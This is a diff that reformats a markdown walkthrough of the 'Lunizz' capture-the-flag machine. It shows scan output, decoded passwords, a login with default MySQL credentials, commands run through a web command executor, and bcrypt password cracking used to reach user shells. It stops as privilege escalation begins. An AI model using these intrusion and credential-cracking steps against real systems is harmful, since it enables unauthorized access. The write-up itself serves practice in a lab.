@@ -1,6 +1,6 @@
-##Lunizz CTF
+## Lunizz CTF
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Thu Mar  4 15:05:13 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,80,3306,4444,5000 10.10.187.91
 Nmap scan report for 10.10.187.91
@@ -122,7 +122,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Mar  4 15:05:30 2021 -- 1 IP address (1 host up) scanned in 17.83 seconds
 ```
 
-#Port 80 Enumeration
+# Port 80 Enumeration
 Start enumeration while moving on to other open ports, final results below
 ```
 # gobuster dir -u http://10.10.187.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster/initial                                         
@@ -146,8 +146,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /whatever (Status: 301)
 ```
 
-#Port 4444
+# Port 4444
 connecting to this port prompts to decode a base64 string including the following
+```
 echo "ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==" | base64 -d
 extremesecurerootpassword
 
@@ -159,12 +160,13 @@ randompassword
 
 echo "bGV0bWVpbg==" | base64 -d
 letmein
+```
 
-Upon entering the correct answer it appear to provide a root shell that then gives a fatal error on any input, so this might just be a rabbit hole
+Upon entering the correct answer it appears to provide a root shell that then gives a fatal error on any input, so this might just be a rabbit hole
 
 Around this point our previous port 80 enumeration found instructions.txt so lets check that out
 
-#instructions.txt
+# instructions.txt
 ```
 Made By CTF_SCRIPTS_CAVE (not real)
 
@@ -182,7 +184,7 @@ please do not use default creds (IT'S DANGEROUS) <<<<<<<<<----------------------
 Looks like we found the default password for the mysql user runcheck
 Lets try and see if we can use this to connect since port 3306 for mysql is open
 
-#mysql
+# mysql
 ```
 # mysql -u runcheck -h 10.10.187.91 -p
 Enter password:
@@ -250,16 +252,16 @@ MySQL [runornot]>
 ```
 Checking our enumeration we have found more directories, hidden and whatever so lets check these out
 
-#Hidden
+# Hidden
 This seems like a way to upload images, initial attempts to upload a shell do not work so before we try and bypass any possible filters here lets checkout whatever for this command executor we have seemingly enabled.
 
-#Whatever
+# Whatever
 Command Executer Mode :1
 
 Command Executer
 
 looks like we can execture commands for here and the command executor mode is set to 1, we can check that updating the run value, in the sql database changes this mode so with it set to 1 lets try and see what we can find
-
+```
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
@@ -317,7 +319,7 @@ drwxr-xr-x 3 root root 4096 Dec 10 19:17 ..
 -rw-r--r-- 1 adam adam  433 Dec  7 21:47 bcrypt_encryption.py
 
 cat /unusual directory/pass/bcrypt_encryption.py
-```
+
 import base64
 
 password = # https://www.youtube.com/watch?v=-tJYN-eG1zk&ab_channel=QueenOfficial
@@ -329,6 +331,7 @@ print(hashAndSalt)
 salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
 # I wrote this code last year and i didnt save password verify line... I need to find my password
 ```
+
 Interesting looks like a way to get a password for likely the user Adam given the file owner, and given the video its likely from the rockyou password list so lets modify this script to get the password
 
 passDecode.py
@@ -356,7 +359,7 @@ for password in file:
 Given this is bcrypt this is going to take some time...
 Eventually we get a hit though, and we can use this to ssh as adam
 
-#Adam
+# Adam
 ```
 adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt
 do you remember our place
@@ -369,7 +372,7 @@ https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6
 ```
 The location in this link is the next flag and also the password for mason given the message, nocaps or spaces, so lets switch over to mason
 
-#Mason/Privilege Escalation
+# Mason/Privilege Escalation
 We find the user flag in mason's home directory
 After going through the usual privilege escalation routes, we find the following
 ```
